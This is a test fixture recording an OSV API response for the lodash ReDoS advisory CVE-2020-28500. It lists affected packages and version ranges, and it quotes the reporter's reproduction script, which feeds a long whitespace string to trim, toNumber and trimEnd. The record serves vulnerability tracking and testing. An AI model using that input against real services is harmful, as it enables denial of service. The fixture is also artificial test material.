@@ -1,0 +1,145 @@
+{
+ "case": "osv/advisory-ghsa",
+ "tool": "securityCheck",
+ "query": {
+  "operation": "advisory",
+  "id": "GHSA-29mw-wpgm-hmr9"
+ },
+ "recordedAt": "2026-11-05",
+ "unread": [
+  "affected[*].package.ecosystem",
+  "affected[*].package.purl",
+  "database_specific.github_reviewed_at",
+  "database_specific.nvd_published_at",
+  "schema_version"
+ ],
+ "exchanges": [
+  {
+   "request": {
+    "method": "GET",
+    "url": "https://api.osv.dev/v1/vulns/GHSA-29mw-wpgm-hmr9",
+    "accept": "application/json"
+   },
+   "status": 200,
+   "headers": [
+    [
+     "content-type",
+     "application/json"
+    ]
+   ],
+   "digest": "sha256:75a505d298d6e520431d9dfdd16773a66dc8df1aa2c0f9775b468568475962aa",
+   "body": {
+    "id": "GHSA-29mw-wpgm-hmr9",
+    "summary": "Regular Expression Denial of Service (ReDoS) in lodash",
+    "details": "All versions of package lodash prior to 4.17.21 are vulnerable to Regular Expression Denial of Service (ReDoS) via the `toNumber`, `trim` and `trimEnd` functions. \n\nSteps to reproduce (provided by reporter Liyuan Chen):\n```js\nvar lo = require('lodash');\n\nfunction build_blank(n) {\n    var ret = \"1\"\n    for (var i = 0; i < n; i++) {\n        ret += \" \"\n    }\n    return ret + \"1\";\n}\nvar s = build_blank(50000) var time0 = Date.now();\nlo.trim(s) \nvar time_cost0 = Date.now() - time0;\nconsole.log(\"time_cost0: \" + time_cost0);\nvar time1 = Date.now();\nlo.toNumber(s) var time_cost1 = Date.now() - time1;\nconsole.log(\"time_cost1: \" + time_cost1);\nvar time2 = Date.now();\nlo.trimEnd(s);\nvar time_cost2 = Date.now() - time2;\nconsole.log(\"time_cost2: \" + time_cost2);\n```",
+    "aliases": [
+     "CVE-2020-28500"
+    ],
+    "modified": "2025-09-29T21:12:31.102523Z",
+    "published": "2022-01-06T20:30:46Z",
+    "database_specific": {
+     "nvd_published_at": "2021-02-15T11:15:00Z",
+     "cwe_ids": [
+      "CWE-1333",
+      "CWE-400"
+     ],
+     "severity": "MODERATE",
+     "github_reviewed": true,
+     "github_reviewed_at": "2021-03-19T22:45:28Z"
+    },
+    "references": [
+     {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-28500"
+     },
+     {
+      "type": "WEB",
+      "url": "https://cert-portal.siemens.com/productcert/pdf/ssa-637483.pdf"
+     }
+    ],
+    "affected": [
+     {
+      "package": {
+       "name": "lodash",
+       "ecosystem": "npm",
+       "purl": "pkg:npm/lodash"
+      },
+      "ranges": [
+       {
+        "type": "SEMVER",
+        "events": [
+         {
+          "introduced": "4.0.0"
+         },
+         {
+          "fixed": "4.17.21"
+         }
+        ]
+       }
+      ],
+      "database_specific": {
+       "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/01/GHSA-29mw-wpgm-hmr9/GHSA-29mw-wpgm-hmr9.json"
+      }
+     },
+     {
+      "package": {
+       "name": "lodash.trimend",
+       "ecosystem": "npm",
+       "purl": "pkg:npm/lodash.trimend"
+      },
+      "ranges": [
+       {
+        "type": "SEMVER",
+        "events": [
+         {
+          "introduced": "4.0.0"
+         },
+         {
+          "last_affected": "4.5.1"
+         }
+        ]
+       }
+      ],
+      "database_specific": {
+       "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/01/GHSA-29mw-wpgm-hmr9/GHSA-29mw-wpgm-hmr9.json"
+      }
+     },
+     {
+      "package": {
+       "name": "lodash-rails",
+       "ecosystem": "RubyGems",
+       "purl": "pkg:gem/lodash-rails"
+      },
+      "ranges": [
+       {
+        "type": "ECOSYSTEM",
+        "events": [
+         {
+          "introduced": "4.0.0"
+         },
+         {
+          "fixed": "4.17.21"
+         }
+        ]
+       }
+      ],
+      "versions": [
+       "4.0.0",
+       "4.6.1"
+      ],
+      "database_specific": {
+       "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/01/GHSA-29mw-wpgm-hmr9/GHSA-29mw-wpgm-hmr9.json"
+      }
+     }
+    ],
+    "schema_version": "1.9.0",
+    "severity": [
+     {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+     }
+    ]
+   }
+  }
+ ]
+}
